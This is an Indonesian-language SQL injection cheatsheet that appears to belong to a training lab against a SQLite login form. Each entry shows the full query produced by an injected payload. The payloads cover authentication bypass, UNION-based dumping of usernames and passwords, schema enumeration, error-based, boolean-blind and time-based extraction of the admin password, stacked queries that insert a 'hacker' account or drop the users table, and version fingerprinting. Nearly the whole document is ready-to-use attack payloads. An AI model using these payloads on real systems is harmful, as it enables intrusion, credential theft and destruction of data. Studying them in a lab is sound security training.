📋 Cheatsheet — Full Query yang Terbentuk ■ server   ■ injected   ■ commented-out
Classic bypass OR selalu TRUE → kembalikan semua baris 
SELECT * FROM users WHERE username = '' OR '1'='1' --' AND password = ''
Comment bypass login sebagai user tertentu tanpa tahu password 
SELECT * FROM users WHERE username = 'admin' --' AND password = ''
Union-based gabungkan hasil dengan data dari tabel lain 
SELECT * FROM users WHERE username = '' UNION SELECT 1,username,password FROM users --' AND password = ''
Schema enum dump semua nama tabel dan definisi kolomnya 
SELECT * FROM users WHERE username = '' UNION SELECT name,sql FROM sqlite_master WHERE type='table' --' AND password = ''
Error-based pancing SQLiteError yang bocorkan nilai data 
SELECT * FROM users WHERE username = '' AND 1=CAST((SELECT password FROM users WHERE username='admin') AS INTEGER) --' AND password = ''
Boolean blind respons beda untuk TRUE/FALSE → ekstrak data karakter per karakter 
SELECT * FROM users WHERE username = '' AND substr((SELECT password FROM users WHERE username='admin'),1,1)='a' --' AND password = ''
Time-based blind delay respons jika kondisi TRUE (randomblob di SQLite) 
SELECT * FROM users WHERE username = '' AND 1=(SELECT CASE WHEN (1=1) THEN randomblob(150000000) ELSE 0 END) --' AND password = ''
Stacked — INSERT sisipkan statement DML setelah query login pertama 
SELECT * FROM users WHERE username = ''; INSERT INTO users(username,password) VALUES('hacker','pwned') --' AND password = ''
Stacked — DROP hapus tabel sepenuhnya (destructive!) 
SELECT * FROM users WHERE username = ''; DROP TABLE users --' AND password = ''
Stacked — multi insert user baru lalu verifikasi hasilnya sekaligus 
SELECT * FROM users WHERE username = ''; INSERT INTO users(username,password) VALUES('hacker','pwned'); SELECT * FROM users --' AND password = ''
PRAGMA baca info internal schema SQLite 
SELECT * FROM users WHERE username = '' UNION SELECT name,sql FROM pragma_table_info('users') --' AND password = ''
sqlite_version fingerprint versi database target 
SELECT * FROM users WHERE username = '' UNION SELECT sqlite_version(),'fingerprint' --' AND password = ''
